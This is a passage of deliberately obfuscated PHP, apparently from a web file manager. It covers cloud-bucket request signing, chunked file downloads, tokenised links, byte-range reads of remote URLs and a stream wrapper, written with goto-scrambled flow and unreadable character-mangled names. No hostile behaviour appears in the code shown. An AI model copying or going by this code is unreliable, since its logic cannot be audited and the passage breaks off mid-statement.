$dèƒ¥ŒƒĞ®[1341] => $eñÕ¯Ì“‡¼); if ($BÌİÉƒÄÃ) { $c‘¶İÇ±„[$dèƒ¥ŒƒĞ®[1251]] = $BÌİÉƒÄÃ; } $AŒ‡…È‹Ôö = base64_encode(json_encode($c‘¶İÇ±„)); goto f‡†ë Œ‚’; eÅÀ £Ö§Ú: $dèƒ¥ŒƒĞ® =& $_SERVER[¹…ÕÄ]; $Bò‘âµ–Í¼ = $dèƒ¥ŒƒĞ®[8] . $this->bucket; $eñÕ¯Ì“‡¼ = gmdate($dèƒ¥ŒƒĞ®[1272]); goto cÇ•†õ‘©ù; f‡†ë Œ‚’: $Céé¢†± ù = base64_encode(hash_hmac($dèƒ¥ŒƒĞ®[1308], "\120\x4f\123\124\x26{$Bò‘âµ–Í¼}\46{$eñÕ¯Ì“‡¼}\x26{$AŒ‡…È‹Ôö}", md5("{$this->userpass}"), !0)); $B±ö­Í•²· = array($dèƒ¥ŒƒĞ®[1178] => $AŒ‡…È‹Ôö, $dèƒ¥ŒƒĞ®[1342] => "\125\x50\131\x55\116\40{$this->username}\72{$Céé¢†± ù}", $dèƒ¥ŒƒĞ®[175] => $this->endpoint . $Bò‘âµ–Í¼); return $B±ö­Í•²·; goto FŒĞ•ÓÖ†È; FŒĞ•ÓÖ†È: } public function download($fŸ÷ŒÑ„“, $a‘Ş×‡Ä®¶) { goto d¯àŒ¾êƒ¨; d¯àŒ¾êƒ¨: $cª¹¥Ÿ® = IO::getPathInner(IO::mkfile($a‘Ş×‡Ä®¶)); if (!($A“ñòÁçæè = $this->link($fŸ÷ŒÑ„“))) { return !1; } $eĞ“ĞÇ“ˆ  = 0; goto E²É×–‚š; E²É×–‚š: $a£È®ÌÊøß = 1024 * 200; $aÄ…â‹»‘Î = fopen($cª¹¥Ÿ®, $_SERVER[¹…ÕÄ][1292]); while (!0) { $Dùí´™®š¹ = $this->fileSubstr($fŸ÷ŒÑ„“, $eĞ“ĞÇ“ˆ , $a£È®ÌÊøß); if ($Dùí´™®š¹ === !1) { return !1; } fwrite($aÄ…â‹»‘Î, $Dùí´™®š¹); $eĞ“ĞÇ“ˆ  += $a£È®ÌÊøß; if (strlen($Dùí´™®š¹) < $a£È®ÌÊøß) { break; } } goto c‡í™ùã²Å; c‡í™ùã²Å: fclose($aÄ…â‹»‘Î); return $a‘Ş×‡Ä®¶; goto FÎÓãÚ· ; FÎÓãÚ· : } public function link($Dªï¯ôè˜è, $dÀÉ¦îÜï¯ = array()) { $dÁ¼ŠŒ“Ÿ… =& $_SERVER[¹…ÕÄ]; $Dªï¯ôè˜è = trim($Dªï¯ôè˜è, $dÁ¼ŠŒ“Ÿ…[8]); if (!empty($this->token)) { $aÆ¿“Š¤ã¼ = strtotime(date($dÁ¼ŠŒ“Ÿ…[1343])); $fŒËÛ„Úœ› = substr(md5($this->token . $dÁ¼ŠŒ“Ÿ…[280] . $aÆ¿“Š¤ã¼ . $dÁ¼ŠŒ“Ÿ…[1344] . $Dªï¯ôè˜è), 12, 8) . $aÆ¿“Š¤ã¼; $dÀÉ¦îÜï¯[] = $dÁ¼ŠŒ“Ÿ…[1345] . $fŒËÛ„Úœ›; } $b¿Èí¹å§´ = !empty($dÀÉ¦îÜï¯) ? $dÁ¼ŠŒ“Ÿ…[69] . implode($dÁ¼ŠŒ“Ÿ…[280], $dÀÉ¦îÜï¯) : $dÁ¼ŠŒ“Ÿ…[33]; return $this->getHost() . $dÁ¼ŠŒ“Ÿ…[8] . $Dªï¯ôè˜è . $b¿Èí¹å§´; } public function fileOut($a¹íŸˆ´Åˆ, $CÓ‘éÅÙÒ = false, $dƒÃß°¯‡ = false, $E¿ƒ§óà‰í = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($a¹íŸˆ´Åˆ, $CÓ‘éÅÙÒ, $dƒÃß°¯‡, $E¿ƒ§óà‰í); } if (!$dƒÃß°¯‡) { $dƒÃß°¯‡ = $this->pathThis($a¹íŸˆ´Åˆ); } $D”¶ÜÖ”ø = $CÓ‘éÅÙÒ ? array($_SERVER[¹…ÕÄ][1346] . rawurlencode($dƒÃß°¯‡)) : array(); $a¸÷Ô©§´ = $this->link($a¹íŸˆ´Åˆ, $D”¶ÜÖ”ø); $this->fileOutLink($a¸÷Ô©§´); } public function fileOutServer($bôšæ¹”ŒÃ, $AïİÏîßŸ = false, $CÎÒÍÖ¾ö = false, $aç»º¼â„ = '') { parent::fileOut($bôšæ¹”ŒÃ, $AïİÏîßŸ, $CÎÒÍÖ¾ö, $aç»º¼â„); } public function fileOutImage($bĞáá‹¹, $c§íÇˆ™èƒ = 250) { $AîÔÌõ× = $this->link($bĞáá‹¹ . $_SERVER[¹…ÕÄ][1347] . $c§íÇˆ™èƒ); $this->fileOutLink($AîÔÌõ×); } public function fileOutImageServer($Bò‰®¯£‚, $F“‰ô¹®† = 250) { parent::fileOutImage($Bò‰®¯£‚, $F“‰ô¹®†); } public function hashMd5($Eóª‘È¯) { $a¥Ì‘‚´åÏ =& $_SERVER[¹…ÕÄ]; $cğéí“ƒ¬¡ = $this->_objectMeta($Eóª‘È¯); return isset($cğéí“ƒ¬¡[$a¥Ì‘‚´åÏ[206]]) ? $cğéí“ƒ¬¡[$a¥Ì‘‚´åÏ[206]] : !1; } public function size($Bá‡šØ’±â) { $eÕ…ŒÇƒÚå = $this->objectMeta($Bá‡šØ’±â); return $eÕ…ŒÇƒÚå ? $eÕ…ŒÇƒÚå[$_SERVER[¹…ÕÄ][77]] : 0; } public function info($d·†¬«ô¤) { if ($this->isFolder($d·†¬«ô¤)) { return $this->folderInfo($d·†¬«ô¤); } else { if ($this->isFile($d·†¬«ô¤)) { return $this->fileInfo($d·†¬«ô¤); } } return !1; } public function exist($Føº¡ÈÆìí) { return $this->isFile($Føº¡ÈÆìí) || $this->isFolder($Føº¡ÈÆìí); } public function isFile($B¼Ë¾ŒÊŸ) { return !$this->isFolder($B¼Ë¾ŒÊŸ) && $this->objectMeta($B¼Ë¾ŒÊŸ); } public function isFolder($fİ‡º »») { return $this->cacheMethod($_SERVER[¹…ÕÄ][197], $fİ‡º »»); } protected function objectMeta($döÀæç) { return $this->cacheMethod($_SERVER[¹…ÕÄ][198], $döÀæç); } protected function _objectMeta($aˆ­Æ™Ÿ) { goto C©Äµƒâê§; eê»¶·ƒå‰: $f¤ç„»ó° = array($FÕšŒñÙè[29] => isset($aÅê¥à…Á‡[$FÕšŒñÙè[1349]]) ? $aÅê¥à…Á‡[$FÕšŒñÙè[1349]] : null, $FÕšŒñÙè[77] => isset($aÅê¥à…Á‡[$FÕšŒñÙè[1350]]) ? $aÅê¥à…Á‡[$FÕšŒñÙè[1350]] : null, $FÕšŒñÙè[206] => isset($aÅê¥à…Á‡[$FÕšŒñÙè[1351]]) ? $aÅê¥à…Á‡[$FÕšŒñÙè[1351]] : null, $FÕšŒñÙè[1318] => isset($aÅê¥à…Á‡[$FÕšŒñÙè[1352]]) ? $aÅê¥à…Á‡[$FÕšŒñÙè[1352]] : null); $f¤ç„»ó°[$FÕšŒñÙè[1319]] = isset($aÅê¥à…Á‡[$FÕšŒñÙè[1353]]) ? strtotime($aÅê¥à…Á‡[$FÕšŒñÙè[1353]]) : $f¤ç„»ó°[$FÕšŒñÙè[1318]]; return $f¤ç„»ó°; goto aãõ™âÃ¥; B÷¤†‰šèÕ: if (!$A‚­ßö‡™ê[$FÕšŒñÙè[1064]]) { return null; } $aÅê¥à…Á‡ = isset($A‚­ßö‡™ê[$FÕšŒñÙè[1066]]) ? $A‚­ßö‡™ê[$FÕšŒñÙè[1066]] : array(); if (!isset($aÅê¥à…Á‡[$FÕšŒñÙè[1349]])) { return null; } goto eê»¶·ƒå‰; C©Äµƒâê§: $FÕšŒñÙè =& $_SERVER[¹…ÕÄ]; if ($aˆ­Æ™Ÿ == $FÕšŒñÙè[33] || $aˆ­Æ™Ÿ == $FÕšŒñÙè[8]) { return array(); } $A‚­ßö‡™ê = $this->ussRequest($aˆ­Æ™Ÿ, $FÕšŒñÙè[1348]); goto B÷¤†‰šèÕ; aãõ™âÃ¥: } protected function _isFolder($FŞ»¦¸¸»Ë) { $DŞƒˆŒ±æ =& $_SERVER[¹…ÕÄ]; if ($FŞ»¦¸¸»Ë == $DŞƒˆŒ±æ[33] || $FŞ»¦¸¸»Ë == $DŞƒˆŒ±æ[8]) { return !0; } $CÔòÔêº = $this->_objectMeta($FŞ»¦¸¸»Ë); return isset($CÔòÔêº[$DŞƒˆŒ±æ[29]]) && $CÔòÔêº[$DŞƒˆŒ±æ[29]] == $DŞƒˆŒ±æ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($eâêŸ­í•› = false) { } public function exist($fö‘šÓ°çÊ) { $cïİÖ±…†¬ = $this->info($fö‘šÓ°çÊ); return $cïİÖ±…†¬[$_SERVER[¹…ÕÄ][193]]; } public function isFile($B‘Â®…ã´‘) { $a»É±¡ÃŠ = $this->info($B‘Â®…ã´‘); return $a»É±¡ÃŠ[$_SERVER[¹…ÕÄ][193]]; } public function isFolder($DœÛ²æ•¦) { return !1; } public function size($BÍÙ¯¡İÔÑ) { $A¬˜ÍÌÆ¿ = $this->info($BÍÙ¯¡İÔÑ); return $A¬˜ÍÌÆ¿[$_SERVER[¹…ÕÄ][77]]; } public function info($eé¤é÷·±‚) { return $this->infoParse($eé¤é÷·±‚); } public function infoAuth($fóÂ«¬ÌÙ) { return $this->infoParse($fóÂ«¬ÌÙ); } public function infoWithChildren($fŒˆèÁ¸’ê) { return $this->infoParse($fŒˆèÁ¸’ê); } public function infoFull($EÇ‰ğ“±½ˆ) { return $this->infoParse($EÇ‰ğ“±½ˆ); } private function infoParse($Cï‚‰¡öÑè) { $D£ºÏ•³ğˆ =& $_SERVER[¹…ÕÄ]; $d¨ç¥¼½İÙ = $this->header($Cï‚‰¡öÑè); if (!$d¨ç¥¼½İÙ || !$d¨ç¥¼½İÙ[$D£ºÏ•³ğˆ[705]]) { return !1; } $d´·‹Ì” = _get($d¨ç¥¼½İÙ, $D£ºÏ•³ğˆ[333], 0); $dê¡ùÜ Ëß = array($D£ºÏ•³ğˆ[28] => $d¨ç¥¼½İÙ[$D£ºÏ•³ğˆ[28]], $D£ºÏ•³ğˆ[75] => $Cï‚‰¡öÑè, $D£ºÏ•³ğˆ[29] => $D£ºÏ•³ğˆ[173], $D£ºÏ•³ğˆ[77] => intval($d´·‹Ì”), $D£ºÏ•³ğˆ[167] => get_path_ext($d¨ç¥¼½İÙ[$D£ºÏ•³ğˆ[28]]), $D£ºÏ•³ğˆ[1232] => $d´·‹Ì” > 0 && $d¨ç¥¼½İÙ[$D£ºÏ•³ğˆ[1354]], $D£ºÏ•³ğˆ[1233] => !1); return $dê¡ùÜ Ëß; } private function header($AØŒ«†‚¿Å) { goto Eˆ¨«®œØÖ; Aªİ³ÎñË: $GLOBALS[$cÔã²Å±ó®[1355]] = !0; self::$_cacheHeader[$AØŒ«†‚¿Å] = url_header($AØŒ«†‚¿Å); $GLOBALS[$cÔã²Å±ó®[1355]] = $eÏõíë˜µ; goto AÚøÂÂ‹¯è; Eˆ¨«®œØÖ: $cÔã²Å±ó® =& $_SERVER[¹…ÕÄ]; if (isset(self::$_cacheHeader[$AØŒ«†‚¿Å])) { return self::$_cacheHeader[$AØŒ«†‚¿Å]; } $eÏõíë˜µ = isset($GLOBALS[$cÔã²Å±ó®[1355]]) ? $GLOBALS[$cÔã²Å±ó®[1355]] : !1; goto Aªİ³ÎñË; AÚøÂÂ‹¯è: return self::$_cacheHeader[$AØŒ«†‚¿Å]; goto Eˆª§îÃŒ¢; Eˆª§îÃŒ¢: } public function hashSimple($CÆä©ñí©Ø, $b¶ Ÿ²É« = false) { goto C†›—ñ«Ø; Bœ­òÙöñŞ: $eØ±º’ëŞç = $Aõ‘í‚‘¬[$C‘Ïƒ†¿›ì[77]]; $a­öíˆÉ‰‚ = 200; $e‹®‰ö ğ = 50; goto F×©Ü•Œá; F×©Ü•Œá: if ($eØ±º’ëŞç <= $a­öíˆÉ‰‚ * $e‹®‰ö ğ) { return md5($this->fileSubstr($CÆä©ñí©Ø, 0, $eØ±º’ëŞç)) . $eØ±º’ëŞç; } $EÄ½†ÕÆĞ = intval($eØ±º’ëŞç / $e‹®‰ö ğ); $aØôŸï©¼‰ = $C‘Ïƒ†¿›ì[33]; goto eÃ™éî‰««; eÃ™éî‰««: $a‚†ÈÕ¾“™ = timeFloat(); $AÆÇ½§¤ ª = 15; for ($B¬ªè¤èˆ = 0; $B¬ªè¤èˆ < $e‹®‰ö ğ; $B¬ªè¤èˆ++) { if (timeFloat() - $a‚†ÈÕ¾“™ > $AÆÇ½§¤ ª) { return !1; } $CïÂª„Ö‹í = $this->fileSubstr($CÆä©ñí©Ø, $EÄ½†ÕÆĞ * $B¬ªè¤èˆ, $a­öíˆÉ‰‚); if (!$CïÂª„Ö‹í) { return !1; } $aØôŸï©¼‰ .= $CïÂª„Ö‹í; } goto dó¹«Î»áè; dó¹«Î»áè: $aØôŸï©¼‰ .= $this->fileSubstr($CÆä©ñí©Ø, $eØ±º’ëŞç - $a­öíˆÉ‰‚, $a­öíˆÉ‰‚); return md5($aØôŸï©¼‰) . $eØ±º’ëŞç; goto bŸä¯ †ôŠ; C†›—ñ«Ø: $C‘Ïƒ†¿›ì =& $_SERVER[¹…ÕÄ]; $Aõ‘í‚‘¬ = $this->info($CÆä©ñí©Ø); if (!$Aõ‘í‚‘¬ || !$Aõ‘í‚‘¬[$C‘Ïƒ†¿›ì[193]]) { return !1; } goto Bœ­òÙöñŞ; bŸä¯ †ôŠ: } public function getContent($Fìßø‘–ë) { return $this->fileSubstr($Fìßø‘–ë); } public function fileSubstr($BĞÆŞ÷İàİ, $E’ŠµÙ±Ÿğ = 0, $då’Ã‚ö»¬ = -1) { goto e˜ÒÊ½¶¨; a¶÷è‚Š—: $FØÁÍÖºœ‰ = url_request($BĞÆŞ÷İàİ, $Còê÷½Ø¬[226], !1, $f²×é—¸ÎÛ, !1, !1, 1); return $FØÁÍÖºœ‰[$Còê÷½Ø¬[1066]] ? $FØÁÍÖºœ‰[$Còê÷½Ø¬[1066]] : $Còê÷½Ø¬[33]; goto e•»øğ¡Šï; e˜ÒÊ½¶¨: $Còê÷½Ø¬ =& $_SERVER[¹…ÕÄ]; $Fˆ¨ÚÙÁº = $this->info($BĞÆŞ÷İàİ); if (!$Fˆ¨ÚÙÁº || !$Fˆ¨ÚÙÁº[$Còê÷½Ø¬[193]] && $Fˆ¨ÚÙÁº[$Còê÷½Ø¬[77]] > 1024 * 1024 * 10) { return !1; } goto C÷«ĞãŞ›; C÷«ĞãŞ›: if ($då’Ã‚ö»¬ === -1) { $då’Ã‚ö»¬ = $Fˆ¨ÚÙÁº[$Còê÷½Ø¬[77]]; } if ($då’Ã‚ö»¬ == 0) { return $Còê÷½Ø¬[33]; } $f²×é—¸ÎÛ = array($Còê÷½Ø¬[1356] . $E’ŠµÙ±Ÿğ . $Còê÷½Ø¬[731] . ($E’ŠµÙ±Ÿğ + $då’Ã‚ö»¬ - 1)); goto a¶÷è‚Š—; e•»øğ¡Šï: } public function download($F²Ï‰‰ÅÖâ, $eÆœ™ÌØŠÓ) { Downloader::start($F²Ï‰‰ÅÖâ, $eÆœ™ÌØŠÓ); return $eÆœ™ÌØŠÓ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($dˆ…Õä±¬’, $e³ÙÅ£Æ = '') { goto DÆÑæßçœƒ; cÒêß“Š‰: $this->pathOpen = $dˆ…Õä±¬’; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto Bµ‚Ä‡Âè; DÆÑæßçœƒ: $this->info = $this->info($dˆ…Õä±¬’); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹…ÕÄ][75]]; goto cÒêß“Š‰; Bµ‚Ä‡Âè: if (!isset(self::$_chunkBuffer[$dˆ…Õä±¬’])) { self::$_chunkBuffer[$dˆ…Õä±¬’] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto DÂÈõ´¿¸ª; DÂÈõ´¿¸ª: } function stream_read($bµùØÑâùÀ) { $A§Äº¨Ş = $this->fileSubstr($this->pose, $bµùØÑâùÀ); $this->pose += strlen($A§Äº¨Ş); return $A§Äº¨Ş; } public function stream_tell() { return $this->pose; } public function stream_seek($CÕ¸¼ã£Á, $EõÁÅñÁ¤Œ) { $c—Ï¿ï¶¾Ñ =& $_SERVER[¹…ÕÄ]; if ($EõÁÅñÁ¤Œ == SEEK_SET) { $this->pose = $CÕ¸¼ã£Á; } else { if ($EõÁÅñÁ¤Œ == SEEK_CUR) { $this->pose += $CÕ¸¼ã£Á; } else { if ($EõÁÅñÁ¤Œ == SEEK_END) { $this->pose = $this->info[$c—Ï¿ï¶¾Ñ[77]] + intval($CÕ¸¼ã£Á); } } } if ($CÕ¸¼ã£Á < 0) { $this->pose = $this->info[$c—Ï¿ï¶¾Ñ[77]] + $CÕ¸¼ã£Á; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹…ÕÄ][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($BÕ‹è£¤¸, $E°ø¯§£¥¿) { $B¡¼¥¦ä¿Š =& $_SERVER[¹…ÕÄ]; $AÀ‚Š«ŠŠâ = $this->info($BÕ‹è£¤¸); return array($B¡¼¥¦ä¿Š[1357] => 0, $B¡¼¥¦ä¿Š[1358] => 0, $B¡¼¥¦ä¿Š[12] => 32768 + 511, $B¡¼¥¦ä¿Š[1359] => 0, $B¡¼¥¦ä¿Š[1360] => 0, $B¡¼¥¦ä¿Š[1361] => 0, $B¡¼¥¦ä¿Š[1362] => 0, $B¡¼¥¦ä¿Š[77] => $AÀ‚Š«ŠŠâ[$B¡¼¥¦ä¿Š[77]], $B¡¼¥¦ä¿Š[1363] => $AÀ‚Š«ŠŠâ[$B¡¼¥¦ä¿Š[1231]], $B¡¼¥¦ä¿Š[1319] => $AÀ‚Š«ŠŠâ[$B¡¼¥¦ä¿Š[83]], $B¡¼¥¦ä¿Š[1318] => $AÀ‚Š«ŠŠâ[$B¡¼¥¦ä¿Š[192]], $B¡¼¥¦ä¿Š[1364] => 0, $B¡¼¥¦ä¿Š[1365] => 0); } static $fileInfo = array(); public function info($dÑƒ÷óóÑá) { $fŒŒÜ„â¯ˆ = $_SERVER[¹…ÕÄ][1366]; if (isset(self::$fileInfo[$dÑƒ÷óóÑá])) { return self::$fileInfo[$dÑƒ÷óóÑá]; } if (substr($dÑƒ÷óóÑá, 0, strlen($fŒŒÜ„â¯ˆ)) != $fŒŒÜ„â¯ˆ) { return !1; } self::$fileInfo[$dÑƒ÷óóÑá] = IO::info(substr($dÑƒ÷óóÑá, strlen($fŒŒÜ„â¯ˆ))); return self::$fileInfo[$dÑƒ÷óóÑá]; } public static function read($E‰ùºÊ›ôÓ, $C„†ï“‹ï, $cÕ¶óÉ³ø·) { if (!isset(self::$_fopenCache[$E‰ùºÊ›ôÓ])) { $B‚â®¥¼Ã = new StreamWrapperIO(); $B‚â®¥¼Ã->stream_open($E‰ùºÊ›ôÓ); self::$_fopenCache[$E‰ùºÊ›ôÓ] = $B‚â®¥¼Ã; } $B‚â®¥¼Ã = self::$_fopenCache[$E‰ùºÊ›ôÓ]; return $B‚â®¥¼Ã->fileSubstr($C„†ï“‹ï, $cÕ¶óÉ³ø·); } public static function _read($DÄ°‚ê—Åì, $dëó©Îß¿Š, $fæ¢†¹¹Äñ) { goto f¾Ïùå×ó¾; D¤Âñ–‘¥: $DÃº‡Ù°»¬ = 0; while ($DÃº‡Ù°»¬ < $fæ¢†¹¹Äñ) { $FåÀËÌ´†Æ = min($a»·†ŸÒíˆ, $fæ¢†¹¹Äñ - $DÃº‡Ù°»¬); $f°ˆÄ½­Ì .= fread($AÎÚËˆêˆÚ, $FåÀËÌ´†Æ); $DÃº‡Ù°»¬ += $FåÀËÌ´†Æ; } fclose($AÎÚËˆêˆÚ); goto C¥ì½—È›ƒ; aç“º†ŠÆ‚: $a»·†ŸÒíˆ = 8192; fseek($AÎÚËˆêˆÚ, $dëó©Îß¿Š, SEEK_SET); $f°ˆÄ½­Ì = $f¨‡ğ³£Ï™[33]; goto D¤Âñ–‘¥; C¥ì½—È›ƒ: return $f°ˆÄ½­Ì; goto dí´•¾¦Õ•; f¾Ïùå×ó¾: $f¨‡ğ³£Ï™ =& $_SERVER[¹…ÕÄ]; $AÎÚËˆêˆÚ = fopen($DÄ°‚ê—Åì, $f¨‡ğ³£Ï™[1235]); if (!$AÎÚËˆêˆÚ) { return $f¨‡ğ³£Ï™[33]; } goto aç“º†ŠÆ‚; dí´•¾¦Õ•: } public function fileSubstr($cË÷Ò‰³ø÷, $eƒ¡‘è½) { goto E—®µçëÕí; E—®µçëÕí: $a¹Ø¯«Ë©¢ =& $_SERVER[¹…ÕÄ]; $C¼«ƒáŠíø = $this->info[$a¹Ø¯«Ë©¢[77]]; $AÑİ«ù²¡„ = $cË÷Ò‰³ø÷; goto bÂÕÊ•¸Šß; FïôÙôÒ›Ã: $A¤±¦á°Íù = ceil(($cË÷Ò‰³ø÷ + $eƒ¡‘è½) / $E„âáÑ²°Ã) * $E„âáÑ²°Ã - $a ã‹ö£•ƒ; $c™â…‚ÈÌ = IO::fileSubstr($this->path, $a ã‹ö£•ƒ, $A¤±¦á°Íù); $f´ã¥œ‹³‡[$a ã‹ö£•ƒ . $a¹Ø¯«Ë©¢[33]] = $c™â…‚ÈÌ; goto Eì‰ˆêÔš‰; E—ğ¸æ±ğ: foreach ($f´ã¥œ‹³‡ as $bø¢¨›Âˆ˜ => $bŠİÔğÅàƒ) { $bø¢¨›Âˆ˜ = intval($bø¢¨›Âˆ˜); $cœêÁÛˆµÓ = $bø¢¨›Âˆ˜ + strlen($bŠİÔğÅàƒ); if ($cË÷Ò‰³ø÷ >= $cœêÁÛˆµÓ) { continue; } if ($cË÷Ò‰³ø÷ >= $bø¢¨›Âˆ˜ && $cË÷Ò‰³ø÷ + $eƒ¡‘è½ <= $cœêÁÛˆµÓ) { return substr($bŠİÔğÅàƒ, $cË÷Ò‰³ø÷ - $bø¢¨›Âˆ˜, $eƒ¡‘è½); } break; } if (count($f´ã¥œ‹³‡) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($a¹Ø¯«Ë©¢[1367], $a¹Ø¯«Ë©¢[1368] . count($f´ã¥œ‹³‡) . "\73\x73\164\141\162\x74\75{$cË÷Ò‰³ø÷}\54\x6c\x65\x6e\x67\x74\x68\x3d{$eƒ¡‘è½}\73\160\157\x73\x65\72{$bø¢¨›Âˆ˜}\x7e{$cœêÁÛˆµÓ}"); throw new Exception($a¹Ø¯«Ë©¢[1369]); } $a ã‹ö£•ƒ = intval($cË÷Ò‰³ø÷ / $E„âáÑ²°Ã) * $E„âáÑ²°Ã; goto FïôÙôÒ›Ã; A¶ä‰ì¶ùˆ: $E„âáÑ²°Ã = 64 * 1024; $f´ã¥œ‹³‡ =& self::$_chunkBuffer[$this->path]; if (!$f´ã¥œ‹³‡) { $f´ã¥œ‹³‡ = array(); } goto cßƒ¿êáƒ“; cßƒ¿êáƒ“: $bø¢¨›Âˆ˜ = 0; $cœêÁÛˆµÓ = 0; $bŠİÔğÅàƒ = $a¹Ø¯«Ë©¢[33]; goto E—ğ¸æ±ğ; C¯ÛÃ¾‚íŒ: if ($cË÷Ò‰³ø÷ + $eƒ¡‘è½ > $C¼«ƒáŠíø) { $eƒ¡‘è½ = $C¼«ƒáŠíø - $cË÷Ò‰³ø÷; } if ($eƒ¡‘è½ <= 0) { return $a¹Ø¯«Ë©¢[33]; } if ($cË÷Ò‰³ø÷ < 0 || $cË÷Ò‰³ø÷ >= $C¼«ƒáŠíø || $eƒ¡‘è½ <= 0 || $eƒ¡‘è½ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\x69\x6c\x65\122\145\x61\144\40\x65\x72\x72\x6f\162\41\x20\x73\164\141\x72\164\x3d{$cË÷Ò‰³ø÷}\x3b\x6c\x65\x6e\x67\x74\x68\x3d{$eƒ¡‘è½}\73\40\163\x69\x7a\145\75{$C¼«ƒáŠíø}\73"); } goto A¶ä‰ì¶ùˆ; bÂÕÊ•¸Šß: $Dó¶Ãí¸Æ = $eƒ¡‘è½; if ($cË÷Ò‰³ø÷ < 0) { $cË÷Ò‰³ø÷ = $C¼«ƒáŠíø + $cË÷Ò‰³ø÷; } if ($eƒ¡‘è½ === !1) { $eƒ¡‘è½ = $C¼«ƒáŠíø - $cË÷Ò‰³ø÷; } goto C¯ÛÃ¾‚íŒ; Eì‰ˆêÔš‰: ksort($f´ã¥œ‹³‡); $FÒ¿Ì¬¸Œ = substr($c™â…‚ÈÌ, $cË÷Ò‰³ø÷ - $a ã‹ö£•ƒ, $eƒ¡‘è½); return $FÒ¿Ì¬¸Œ; goto Dˆ²‚—Îî¢; Dˆ²‚—Îî¢: } private function log($eì‘šÊğòù, $EÊŒøÑÙÚ) { $díö„¯º =& $_SERVER[¹…ÕÄ]; $C¹ŠÊŞ´äõ = timeFloat() - $this->timeStart; write_log(sprintf($díö„¯º[1370], $eì‘šÊğòù, $this->info[$díö„¯º[28]], $C¹ŠÊŞ´äõ, $EÊŒøÑÙÚ), $díö„¯º[1056]); } } goto dªÜãçÀµŸ; cÑ— Ë˜åÊ: function binCheckBigger($f³¡Úöñó¯, $c³î’‚§©â) { return $f³¡Úöñó¯ > $c³î’‚§©â; } $_SERVER[$_SERVER[ùÃ ©ñâ][3]] = ("\x38\x39\x31\x36"."\x30\x32")+0;$_Ebgx="iAHCNm8FaXz32tyiumEE9phGvSPgtSVUWuqIgyQC3kZS8BXCPT2EGxJTKcbESXXEd5IMssb6Y5Ji";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($AŸßºæŞ²Š, $bÙ™‰ÏÜĞµ) { $A¬Ì­´÷ =& $_SERVER[¹…ÕÄ]; if (isset(self::$_methodList[$AŸßºæŞ²Š])) { return @call_user_func_array(self::$_methodList[$AŸßºæŞ²Š], $bÙ™‰ÏÜĞµ); } else { if (method_exists($this, $AŸßºæŞ²Š)) { return call_user_func_array(array($this, $AŸßºæŞ²Š), $bÙ™‰ÏÜĞµ); } else { think_exception(__CLASS__ . $A¬Ì­´÷[4] . $AŸßºæŞ²Š . $A¬Ì­´÷[5]); } } } public static function __callStatic($d’ƒ¬ÌŒ¡Ê, $cœäĞÆÒïƒ) { if (isset(self::$_methodListStatic[$d’ƒ¬ÌŒ¡Ê])) { return call_user_func_array(self::$_methodListStatic[$d’ƒ¬ÌŒ¡Ê], $cœäĞÆÒïƒ); } else { if (method_exists(self, $d’ƒ¬ÌŒ¡Ê)) { return call_user_func_array(array(self, $d’ƒ¬ÌŒ¡Ê), $cœäĞÆÒïƒ); } else { show_json("{$d’ƒ¬ÌŒ¡Ê}\x28\51\x20\x6e\157\x74\x20\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($cï¬ÕÜˆ¦², $d—ºàï²’ê) { self::$_methodList[$cï¬ÕÜˆ¦²] = $d—ºàï²’ê; } public static function addMethodStatic($dˆóÒ‘¦±, $DÏÖÌ³‡Šï) { self::$_methodListStatic[$dˆóÒ‘¦±] = $DÏÖÌ³‡Šï; } } goto FÄÓ©ª„³; f¸áŞ¦Ü¤: class PathDriverDriverShareItem { public function __construct($eã‰–…ƒóà) { $this->pathParse = $eã‰–…ƒóà; } public function __call($Aôæ‡ŒÔÛô, $a£¢½Ì) { $f¤¦ìÁ‡Ó½ =& $_SERVER[¹…ÕÄ]; if (method_exists($this, $Aôæ‡ŒÔÛô)) { return; } $a½ê‘›¦ÓŠ = call_user_func_array(array($f¤¦ìÁ‡Ó½[1191], $Aôæ‡ŒÔÛô), $a£¢½Ì); $EİÑôäº…¾ = array($f¤¦ìÁ‡Ó½[1192], $f¤¦ìÁ‡Ó½[1193], $f¤¦ìÁ‡Ó½[1194], $f¤¦ìÁ‡Ó½[1195], $f¤¦ìÁ‡Ó½[513], $f¤¦ìÁ‡Ó½[515], $f¤¦ìÁ‡Ó½[1196], $f¤¦ìÁ‡Ó½[106], $f¤¦ìÁ‡Ó½[1197], $f¤¦ìÁ‡Ó½[1198]); if (in_array($Aôæ‡ŒÔÛô, $EİÑôäº…¾)) { $a½ê‘›¦ÓŠ = $this->getPathOuter($a½ê‘›¦ÓŠ); } return $a½ê‘›¦ÓŠ; } public function copy($cŞ¯ÇÍ¸ä¥, $C¹–Ò¸ö“‡, $e½øİÛ¼… = false) { return $this->copyMove($cŞ¯ÇÍ¸ä¥, $C¹–Ò¸ö“‡, $e½øİÛ¼…, $_SERVER[¹…ÕÄ][513]); } public function move($eˆéË®®Û´, $dˆ©öº›˜³, $D™”ŠÔĞ½¼ = false) { return $this->copyMove($eˆéË®®Û´, $dˆ©öº›˜³, $D™”ŠÔĞ½¼, $_SERVER[¹…ÕÄ][515]); } private function copyMove($bƒÊ‚¿Û‰Ÿ, $fİŠøÓç®¹, $Aæ¬ïæ¬Œ, $f®÷–™³Ì) { goto cÜæµ™Ú‹ñ; CˆÔØòÕ†á: return $f¥—áí…“; goto DÂ‹Ö¤ƒé; cÜæµ™Ú‹ñ: $C—å‡øŞö =& $_SERVER[¹…ÕÄ]; $B„ÖëÌÑãÚ = $fİŠøÓç®¹; $a÷‡á„ß = IO::driverMake($fİŠøÓç®¹); goto EÃ“Û‰Ñ±; EÃ“Û‰Ñ±: if 